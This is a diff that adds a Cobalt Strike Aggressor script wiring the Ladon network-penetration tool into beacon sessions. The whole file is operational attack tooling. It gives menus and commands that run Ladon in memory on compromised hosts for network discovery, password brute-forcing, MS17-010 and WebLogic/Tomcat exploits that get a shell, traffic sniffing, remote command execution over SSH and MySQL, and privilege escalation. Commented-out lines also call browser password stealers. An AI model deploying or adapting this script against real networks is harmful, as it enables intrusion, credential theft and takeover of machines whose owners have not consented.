@@ -1,0 +1,376 @@
+#Ladon 10.6 for Cobalt Strike
+#author:	k8gege
+#blog:		http://k8gege.org/Ladon
+#github:	https://github.com/k8gege
+#teston:	CS 3.x & 4.x
+#update: 	20230118
+
+#Some functions are not compatible with CS, please use exe version
+#Not Support: [NbtScan VncScan MysqlScan OracleScan SSHscan WinrmScan]  
+#Not Support: [SubDomain PsExec WinrmExec CVE-2021-40444] 
+#Not Support: [runps urlscan zerologon sameweb webdir weblogicpoc tomcatpoc webser]
+#Not Support: [SubDomain PsExec WinrmExec cmddll cve-2021-40444]
+
+beacon_command_register(
+"Ladon", 
+"Ladon large network penetration scanner", 
+"\nUsing: Ladon help\nLadon is a multi-threaded plug-in comprehensive scanning artifact for large-scale network penetration, including port scanning, service identification, network assets, password explosion, high-risk vulnerability detection and one click getshell. It supports batch a / B / C segment scanning and cross network segment scanning, as well as URL, host and domain name list scanning. Version 10.6 has built-in 180 function modules and 18 external modules. Through a variety of protocols and methods, it can quickly obtain the IP, computer name, working group, shared resources, network card address, operating system version, website, subdomain name, middleware, open service, router, database and other information of the target network");
+
+alias Ladon {
+	if (-exists script_resource("Ladon.exe")) {
+	if ($2 eq "help"){
+	blog2($1, "Ladon 10.6");
+	blog2($1, "Usage:");
+	#blog2($1, "Ladon 1");
+	#blog2($1, "Ladon ip");
+	blog2($1, "Ladon ip scantype");
+	#blog2($1, "Ladon noping");
+	blog2($1, "Ladon noping ip");
+	blog2($1, "Ladon noping ip scantype");	
+	blog2($1, "ScanType:(Discover/Brute/Encode/Exploit)");
+	blog2($1, "ip: [ip ip/24 ip/26 ip/8]");
+	blog2($1, "Discover: [ICMP Ping OnlineIP OnlinePC OSscan CiscoScan OxidScan DnsScan]");
+	blog2($1, "Discover: [WebScan SameWeb UrlScan WhatCMS WebDir Host2IP Domain2IP]");
+	blog2($1, "Discover: [SmbInfo WmiInfo RdpInfo SnmpInfo MssqlInfo ExchangeInfo WinrmInfo WPinfo SslInfo]");
+	blog2($1, "Vulnerable: [MS17010 SmbGhost WeblogicPoc PhpStudyPoc ActiveMQPoc TomcatPoc Struts2Poc CVE-2022-26134]");
+	blog2($1, "Vulnerable: [WeblogicExp TomcatExp]");
+	blog2($1, "Brute-Force: [LdapScan FtpScan WmiScan SmbScan ExchangeScan LdapScan SmbHashScan WmiHashScan 401Scan DvrScan]");
+	blog2($1, "Discover: [EnumMssql EnumShare EnumIIS EnumProcess GetCmdLine GetInfo GetInfo2 GetPipe GetHtml AdiDnsDump]");
+	blog2($1, "Encode: [EnHex DeHex EnBase64 DeBase64]");
+	blog2($1, "Sinffer: [[Sniffer FtpSniffer HttpSniffer HttpDownload FtpDownload]]");
+	blog2($1, "RemoteExec: [SmbExec AtExec WmiExec WmiExec2 SshExec JspShell WebShell AspxShell AspShell PhpShell]");
+	blog2($1, "GetInfo: [AutoRun CheckDoor EnableDotNet GetIP GetHtml]");
+	blog2($1, "Elevate: [MS16135 BypassUAC GetSystem Runas RunPS SweetPotato BadPotato]");
+	blog2($1, "Example: Ladon 192.168.1.8/24 OnlinePC");	
+	blog2($1, "Example: Ladon 192.168.1.8/24 *.ini");	
+	blog2($1, "Example: Ladon 192.168.1.8/24 *.ps1");
+	blog2($1, "Example: Ladon 192.168.1.8/24 *.dll(c#)");
+	blog2($1, "Example: Ladon 192.168.1.8/24 *.exe(c#)");	
+	return;}else{
+	# if ($2 eq "SmbExec" || $2 eq "AtExec" || $2 eq "WmiExec" || $2 eq "WmiExec2" || $2 eq "JspShell" || $2 eq "AspShell" || $2 eq "AspxShell" || $2 eq "PhpShell" || $2 eq "BypassUac" || $2 eq "BypassUac2" || $2 eq "GetSystem" || $2 eq "Runas" || $2 eq "ms16135" || $2 eq "SweetPotato" || $2 eq "CVE-2021-1675" || $2 eq "PrintNightmare"){
+	# bexecute_assembly!($1, script_resource("res/Ladon20.dat"), $2.' '.$3.' '.$4.' '.$5.' '.$6.' '.$7.' '.$8);
+	# }else if ($2 eq "BadPotato" || $2 eq "CVE-2020-0688" || $2 eq "CVE-2021-36934" || $2 eq "RdpHijack" || $3 eq "ExchangeScan" || $4 eq "ExchangeScan"){
+	# bexecute_assembly!($1, script_resource("res/Ladon40.dat"), $2.' '.$3.' '.$4.' '.$5.' '.$6.' '.$7.' '.$8);
+	# }else if ($2 eq "GetIP" || $2 eq "Whoami" || $2 eq "GetID" || $2 eq "GetInfo" || $2 eq "GetInfo2" || $2 eq "tasklist" || $2 eq "cmdline" || $2 eq "getcmdline" || $2 eq "Tasklist" || $2 eq "EnumProcess" || $2 eq "Cmdline" || $2 eq "GetCmdline" || $2 eq "AllVer"  || $2 eq "Ver" || $2 eq "NetVer" || $2 eq "PSver" || $2 eq "NetVersion" || $2 eq "PSversion" || $2 eq "CheckDoor" || $2 eq "AutoRun" || $2 eq "Recent" || $2 eq "RdpLog" || $2 eq "UsbLog" || $2 eq "QueryAdmin" || $2 eq "GetPipe" || $2 eq "QueryProxy"){
+	# bexecute_assembly!($1, script_resource("res/LadonInfo.dat"), $2.' '.$3.' '.$4.' '.$5.' '.$6.' '.$7.' '.$8);
+	# }else if ($3 eq "ICMP" || $3 eq "Ping" || $3 eq "OnlineIP" || $4 eq "OnlineIP" || $3 eq "icmp" || $3 eq "ping"){
+	# bexecute_assembly!($1, script_resource("res/LadonInfo.dat"), $2.' '.$3.' '.$4.' '.$5.' '.$6.' '.$7.' '.$8);
+	# }else if ($3 eq "MS17010" || $3 eq "SmbGhost" || $3 eq "Struts2Poc" || $3 eq "WeblogicPoc" || $3 eq "PhpStudyPoc" || $3 eq "TomcatPoc" || $3 eq "ActiveMQPoc" || $3 eq "CVE-2022-26134" || $4 eq "MS17010" || $4 eq "SmbGhost" || $4 eq "Struts2Poc" || $4 eq "WeblogicPoc" || $4 eq "PhpStudyPoc" || $4 eq "TomcatPoc" || $4 eq "ActiveMQPoc" || $4 eq "CVE-2022-26134"){
+	# bexecute_assembly!($1, script_resource("res/LadonPoc.dat"), $2.' '.$3.' '.$4.' '.$5.' '.$6.' '.$7.' '.$8);
+	# }else if ($2 eq "Sniffer" || $2 eq "HttpSniffer" || $2 eq "FtpSniffer" || $3 eq "SmbScan" || $3 eq "WmiScan" || $3 eq "SmbHashScan" || $3 eq "WmiHashScan" || $3 eq "FtpScan" || $3 eq "LdapScan" || $3 eq "MssqlScan" || $3 eq "WebLogicScan" || $3 eq "TomcatScan" || $3 eq "401Scan" || $3 eq "HttpBasicScan" || $3 eq "DvrScan" || $3 eq "WebDir" || $4 eq "SmbScan" || $4 eq "WmiScan" || $4 eq "SmbHashScan" || $4 eq "WmiHashScan" || $4 eq "FtpScan" || $4 eq "LdapScan" || $4 eq "MssqlScan" || $4 eq "WebLogicScan" || $4 eq "TomcatScan" || $4 eq "401Scan" || $4 eq "HttpBasicScan" || $4 eq "DvrScan" || $4 eq "WebDir"){
+	# bexecute_assembly!($1, script_resource("res/Ladon35.dat"), $2.' '.$3.' '.$4.' '.$5.' '.$6.' '.$7.' '.$8);
+	# }else if ($3 eq "OnlinePC" || $3 eq "WhatCMS" || $3 eq "PortScan" || $2 eq "kshell" || $4 eq "OnlinePC" || $4 eq "WhatCMS" || $4 eq "PortScan"){
+	# bexecute_assembly!($1, script_resource("res/Ladon35.dat"), $2.' '.$3.' '.$4.' '.$5.' '.$6.' '.$7.' '.$8);
+	# }else if ($2 eq "ChromePwd" || $2 eq "chromePwd" || $2 eq "chromepwd" || $2 eq "Chromepwd"){
+	# bexecute_assembly!($1, script_resource("res/ChromePwd.dat"),"Start");
+	# }else if ($2 eq "CocCocPwd" || $2 eq "CoccocPwd" || $2 eq "Coccocpwd" || $2 eq "coccocpwd"){
+	# bexecute_assembly!($1, script_resource("res/CocCocPwd.dat"),"Start");
+	# }else if ($2 eq "FirefoxPwd" || $2 eq "Firefoxpwd" || $2 eq "firefoxPwd" || $2 eq "firefoxpwd"){
+	# bexecute_assembly!($1, script_resource("res/FirefoxPwd.dat"),"firefox");
+	# }else if ($2 eq "EdgePwd" || $2 eq "Edgepwd" || $2 eq "edgePwd" || $2 eq "edgepwd"){
+	# bexecute_assembly!($1, script_resource("res/FirefoxPwd.dat"),"edge");
+	# }else{
+	bexecute_assembly!($1, script_resource("Ladon.exe"), $2.' '.$3.' '.$4.' '.$5.' '.$6.' '.$7.' '.$8);
+	#}
+	}
+	# on beacon_output {
+	# $message = replace($2, 'received output:\n'.'');
+	# #if ("ISOK" isin $message){
+	# #blog2($1,"\cD".$2);
+	# #}
+	# @array = split("\r\n",$message);
+	# @data = remove(@array,"");
+
+		# @data[$key] = replaceAt($value, "", 0, 0);
+		# #blog2($1,"\cD0000".88888888);
+		# if ("MS17-010" isin @data[$key]){
+		# blog2($1,"\cD".88888888);
+		# }
+		# if ("CVE-2020-0796" isin @data[$key]){
+		# blog2($1,"\cD".88888888);
+		# }
+	# }
+	# @data = remove(@array,"");
+
+		# @data[$key] = "\"".$value."\"";
+	# }
+	
+	# $string1 = "strat:";
+	# foreach $value (@data){
+		# $string1 = $string1.$value;
+	# }
+
+	# foreach $key (%sr){
+		# if ($key isin $string1){
+			# #blog2($1,"\c8".%sr[$key]);
+		# }
+	# }
+	# }
+	}else {berror($1, "Ladon.exe does not exist :(");}
+}
+
+sub LadonStart {
+	blog2($bid,"Ladon ".$3["moudle"]);
+	bcd!($bid, "c:\\windows\\temp");
+	brm!($bid,"Ladon.exe");
+	brm!($bid,"netscan.dll");
+	#bshell!($bid,"del Ladon**.exe");
+	if($3["moudle"] !eq "Default"){
+		brm!($bid, "netscan.dll");
+	}	
+	bupload!($bid, script_resource("bin\\Ladon".$3['clrver'].".exe"));
+	bmv!($bid, "Ladon".$3['clrver'].".exe", "Ladon.exe");
+	if($3["moudle"] !eq "Default"){
+		bupload!($bid, script_resource("bin\\".$3['moudle']."\\netscan".$3['clrver'].".dll"));
+		bmv!($bid, "netscan".$3['clrver'].".dll", "netscan.dll");
+	}
+
+	bshell!($bid, "Ladon.exe");
+	#bpause($1, 10000);
+	brm!($bid,"Ladon.exe");
+	if($3["moudle"] !eq "Default"){
+		brm!($bid, "netscan.dll");
+	}
+}
+
+sub LadonScan {
+	if (-exists script_resource("Ladon.exe")) {
+	if ($3['tar'] eq ""){
+	return;
+	}else
+	{
+	blog2($bid,"Ladon ".$3['tar'].' '.$3['moudle']);
+	bexecute_assembly!($bid, script_resource("Ladon.exe"), $3['tar'].' '.$3['moudle']);}
+	}else {berror($1, "Ladon.exe does not exist :(");}
+}
+
+sub LadonScan3 {
+	if (-exists script_resource("res/Ladon35.exe")) {
+	if ($3['tar'] eq ""){
+	return;
+	}else
+	{
+	blog2($bid,"\c8Ladon ".$3['tar'].' '.$3['moudle']);
+	bexecute_assembly!($bid, script_resource("res/Ladon35.exe"), $3['tar'].' '.$3['moudle']);}
+	}else {berror($1, "Ladon35.exe does not exist :(");}
+}
+
+sub GetInfo {
+	if (-exists script_resource("Ladon.exe")) {
+	if ($3['moudle'] eq ""){
+	return;
+	}else
+	{
+	blog2($bid,"Ladon ".$3['moudle']);
+	bexecute_assembly!($bid, script_resource("Ladon.exe"),$3['moudle']);}
+	}else {berror($1, "Ladon.exe does not exist :(");}
+}
+alias sshcmd {
+	if (-exists script_resource("res/sshcmd.dat")) {
+	if ($2 eq ""){
+	blog2($1, "Usage: sshcmd host port user pass cmdline");
+	blog2($1, "Example: sshcmd 192.168.1.8 22 root toor whoami");
+	blog2($1, "Example: sshcmd 192.168.1.8 22 root toor download /tmp/down.rar c:\\down.rar");
+	blog2($1, "Example: sshcmd 192.168.1.8 22 root toor upload c:\\upload.rar /tmp/upload.rar");
+	return;}else
+	{bexecute_assembly!($1, script_resource("res/sshcmd.dat"), $2.' '.$3.' '.$4.' '.$5.' '.$6.' '.$7.' '.$8);}
+	}else {berror($1, "sshcmd.dat does not exist :(");}
+}
+alias mysqlcmd {
+	#blog2($1, $5);
+	if (-exists script_resource("res/mysqlcmd.dat")) {
+	if ($2 eq ""){
+	blog2($1, "Usage: mysqlcmd host port user pass sql");
+	return;}else
+	{if($5 eq "null")
+	{bexecute_assembly!($1, script_resource("res/mysqlcmd.dat"), $2.' '.$3.' '.$4.' "" '.$6.' "'.$7.'"');}
+	else{
+	bexecute_assembly!($1, script_resource("res/mysqlcmd.dat"), $2.' '.$3.' '.$4.' '.$5.' '.$6.' "'.$7.'"');}
+	}
+	}else {berror($1, "mysqlcmd.dat does not exist :(");}
+}
+sub Sniffer {
+	if (-exists script_resource("Ladon.exe")) {
+	if ($3['tar'] eq ""){
+	return;
+	}else
+	{
+	blog2($bid,"Ladon ".$3['moudle'].' '.$3['tar']);
+	bexecute_assembly!($bid, script_resource("Ladon46.dat"), $3['moudle'].' '.$3['tar']);}
+	}else {berror($1, "Ladon.exe does not exist :(");}
+}
+
+sub HttpDownload {
+	if (-exists script_resource("Ladon.exe")) {
+	if ($3['tar'] eq ""){
+	return;
+	}else
+	{
+	blog2($bid,"Ladon ".$3['moudle'].' '.$3['tar']);
+	bexecute_assembly!($bid, script_resource("Ladon.exe"), $3['moudle'].' '.$3['tar']);}
+	}else {berror($1, "Ladon.exe does not exist :(");}
+}
+
+sub ms17010 {
+	if (-exists script_resource("Ladon.exe")) {
+	if ($2 eq ""){
+	return;}else
+	{bexecute_assembly!($bid, script_resource("Ladon.exe"), $3['tar'].' MS17010');}
+	}else {berror($1, "Ladon.exe does not exist :(");}
+}
+
+alias CVE-2019-2725-POC {
+	if (-exists script_resource("Ladon.exe")) {
+	if ($2 eq ""){
+	return;}else
+	{bexecute_assembly!($1, script_resource("Ladon.exe"), $2.' WeblogicPoc');}
+	}else {berror($1, "Ladon.exe does not exist :(");}
+}
+
+alias CVE-2019-2725-EXP {
+	if (-exists script_resource("Ladon.exe")) {
+	if ($2 eq ""){
+	return;}else
+	{bexecute_assembly!($1, script_resource("Ladon.exe"), $2.' WeblogicExp');}
+	}else {berror($1, "Ladon.exe does not exist :(");}
+}
+
+popup beacon_bottom {
+menu "K8Ladon" {
+item("&Ladon 10.6", { url_open("https://k8gege.org/Ladon?cs"); });
+separator();
+item "Discover" {
+		$bid = $1;
+		$dialog = dialog("Ladon Discover", %(tar => "",moudle => "OnlinePC",clrver => "35",bid => $bid), &LadonScan);
+		dialog_description($dialog, "Target: IP or CIDR or URL or Host or Domain");
+		drow_text($dialog, "tar",  "Target:");
+		drow_combobox($dialog, "moudle", "Moudle:", @("OnlinePC","ICMP","OnlineIP","OSScan", "WebScan", "WhatCMS","CiscoScan","DnsScan","EthScan","EnumMssql","EnumShare"));
+		#drow_combobox($dialog, "clrver", "Version", @("35", "40"));
+		drow_checkbox($dialog, 'type', 'noping');
+		dbutton_action($dialog, "Start");
+		dialog_show($dialog);
+}
+item "Vulnerable" {
+		$bid = $1;
+		$dialog = dialog("Ladon Vulnerable", %(tar => "",moudle => "MS17010",clrver => "35",bid => $bid), &LadonScan);
+		dialog_description($dialog, "Target: IP or CIDR");
+		drow_text($dialog, "tar",  "Target:");
+		drow_combobox($dialog, "moudle", "Moudle:", @("MS17010","SmbGhost","Struts2Poc","WeblogicPoc","PhpStudyPoc","ActiveMQPoc","TomcatPoc"));
+		#drow_combobox($dialog, "clrver", "Version", @("35", "40"));
+		drow_checkbox($dialog, 'type', 'noping');
+		dbutton_action($dialog, "Start");
+		dialog_show($dialog);
+}
+
+item "Exploit" {
+		$bid = $1;
+		$dialog = dialog("Ladon Exploit", %(tar => "",moudle => "MS17010",clrver => "35",bid => $bid), &LadonScan);
+		dialog_description($dialog, "Target: IP or CIDR,Payload is Getshell");
+		drow_text($dialog, "tar",  "Target:");
+		drow_combobox($dialog, "moudle", "Moudle:", @("WeblogicExp","TomcatExp"));
+		#drow_combobox($dialog, "clrver", "Version", @("35", "40"));
+		drow_checkbox($dialog, 'type', 'noping');
+		dbutton_action($dialog, "Start");
+		dialog_show($dialog);
+}
+
+item "Sniffer" {
+		$bid = $1;
+		$dialog = dialog("Ladon Sniffer", %(tar => "",moudle => "HttpSniffer",clrver => "35",bid => $bid), &Sniffer);
+		dialog_description($dialog, "Target: Current Host IP");
+		drow_text($dialog, "tar",  "Target:");
+		drow_combobox($dialog, "moudle", "Moudle:", @("HttpSniffer","FtpSniffer","Sniffer"));
+		#drow_combobox($dialog, "clrver", "Version", @("35", "40"));
+		drow_checkbox($dialog, 'type', 'noping');
+		dbutton_action($dialog, "Start");
+		dialog_show($dialog);
+}
+
+item "Brute-Force" {
+		$bid = $1;
+		$dialog = dialog("Ladon Brute-Force", %(tar => "",moudle => "LdapScan",clrver => "35",bid => $bid), &LadonScan3);
+		dialog_description($dialog, "Target: IP or CIDR or URL or Host<br>Brute-Force: Upload PassWord File to WorkDir");
+		drow_text($dialog, "tar",  "Target:");
+		drow_combobox($dialog, "moudle", "Moudle:", @("LdapScan","SmbScan","SmbHashScan","WmiHashScan","WmiScan","FtpScan","VncScan","MysqlScan","OracleScan","SSHscan","WeblogicScan","TomcatScan","HttpBasicScan","WebDir","SubDomain"));
+		#drow_combobox($dialog, "clrver", "Version", @("35", "40"));
+		drow_checkbox($dialog, 'type', 'noping');
+		dbutton_action($dialog, "Start");
+		dialog_show($dialog);
+}
+
+item "HttpDownload" {
+		$bid = $1;
+		$dialog = dialog("Ladon Download", %(tar => "",moudle => "HttpDownload",clrver => "35",bid => $bid), &HttpDownload);
+		dialog_description($dialog, "Target: url");
+		drow_text($dialog, "tar",  "Target:");
+		drow_combobox($dialog, "moudle", "Moudle:", @("HttpDownload"));
+		#drow_combobox($dialog, "clrver", "Version", @("35", "40"));
+		drow_checkbox($dialog, 'type', 'noping');
+		dbutton_action($dialog, "Start");
+		dialog_show($dialog);
+}
+
+item "DC/LDAP" {
+		$bid = $1;
+		$dialog = dialog("Ladon DC/LDAP", %(tar => "",moudle => "HttpDownload",clrver => "35",bid => $bid), &LadonScan);
+		dialog_description($dialog, "Target: IP");
+		drow_text($dialog, "tar",  "Target:");
+		drow_combobox($dialog, "moudle", "Moudle:", @("AdiDnsDump","LdapScan"));
+		#drow_combobox($dialog, "clrver", "Version", @("35", "40"));
+		drow_checkbox($dialog, 'type', 'noping');
+		dbutton_action($dialog, "Start");
+		dialog_show($dialog);
+}
+
+item "Domain/IP" {
+		$bid = $1;
+		$dialog = dialog("Ladon Domain/IP", %(tar => "",moudle => "HttpDownload",clrver => "35",bid => $bid), &LadonScan);
+		dialog_description($dialog, "Target: Domain or HostName");
+		drow_text($dialog, "tar",  "Target:");
+		drow_combobox($dialog, "moudle", "Moudle:", @("HostIP","DomainIP"));
+		#drow_combobox($dialog, "clrver", "Version", @("35", "40"));
+		drow_checkbox($dialog, 'type', 'noping');
+		dbutton_action($dialog, "Start");
+		dialog_show($dialog);
+}
+
+item "GetInfo" {
+		$bid = $1;
+		$dialog = dialog("Ladon GetInfo", %(tar => "",moudle => "GetCmdLine",clrver => "35",bid => $bid), &GetInfo);
+		dialog_description($dialog, "Get IIS/Process/CmdLine Info");
+		#drow_text($dialog, "tar",  "Target:");
+		drow_combobox($dialog, "moudle", "Moudle:", @("EnumIIS","EnumProcess","GetCmdLine","GetInfo","GetInfo2","GetHtml"));
+		#drow_combobox($dialog, "clrver", "Version", @("35", "40"));
+		drow_checkbox($dialog, 'type', 'noping');
+		dbutton_action($dialog, "Start");
+		dialog_show($dialog);
+}
+
+item "PassWord" {
+		$bid = $1;
+		$dialog = dialog("Ladon PocScan", %(tar => "",moudle => "EnumIIS",clrver => "35",bid => $bid), &GetInfo);
+		dialog_description($dialog, "Get PassWord");
+		#drow_text($dialog, "tar",  "Target:");
+		drow_combobox($dialog, "moudle", "Moudle:", @("EnumIIS"));
+		#drow_combobox($dialog, "clrver", "Version", @("35", "40"));
+		drow_checkbox($dialog, 'type', 'noping');
+		dbutton_action($dialog, "Start");
+		dialog_show($dialog);
+}
+separator();
+item "Test .NET" {
+		$bid = $1;
+		#$dialog = dialog("CLRtest", %(tar => "",moudle => "CLRtest",clrver => "35",bid => $bid), &GetInfo);
+		blog($1,"Test .Net Assembly");
+		bexecute_assembly!($1, script_resource("res/CLRtest.dat"),"Start");
+		#drow_text($dialog, "tar",  "Target:");
+		#drow_combobox($dialog, "moudle", "Moudle:", @("CLRtest"));
+		#drow_combobox($dialog, "clrver", "Version", @("35", "40"));
+		#drow_checkbox($dialog, 'type', 'noping');
+		#dbutton_action($dialog, "Start");
+		#dialog_show($dialog);
+	}
+}}
+
+
+
